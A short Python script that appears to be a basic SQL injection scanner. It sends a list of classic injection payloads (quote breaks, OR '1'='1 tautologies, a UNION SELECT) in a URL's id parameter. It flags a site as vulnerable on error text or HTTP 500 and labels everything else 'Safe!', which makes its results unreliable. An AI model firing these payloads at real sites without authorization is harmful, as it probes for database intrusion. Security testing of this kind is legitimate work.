import requests

def scan_url(target_url):
    results = []
    payloads = [
        "'", "' OR '1'='1", "' OR '1'='1' -- ", "' OR 1=1#", 
        "' OR 'a'='a", "' UNION SELECT NULL,NULL-- "
    ]
    for payload in payloads:
        test_url = f"{target_url}?id={payload}"
        try:
            response = requests.get(test_url, timeout=5)
            if "error" in response.text.lower() or response.status_code == 500:
                results.append({
                    "payload": payload,
                    "message": "🚨 Vulnerability Detected!",
                    "response_snippet": response.text[:100]  # Include snippet of the response
                })
            else:
                results.append({
                    "payload": payload,
                    "message": "✅ Safe!",
                    "response_snippet": response.text[:100]
                })
        except requests.exceptions.RequestException as e:
            results.append({
                "payload": payload,
                "message": f"⚠️ Error occurred: {e}",
                "response_snippet": "N/A"
            })
    return results

if __name__ == "__main__":
    test_url = "http://example.com"
    results = scan_url(test_url)
    for result in results:
        print(f"Payload: {result['payload']}\nMessage: {result['message']}\nSnippet: {result['response_snippet']}\n")
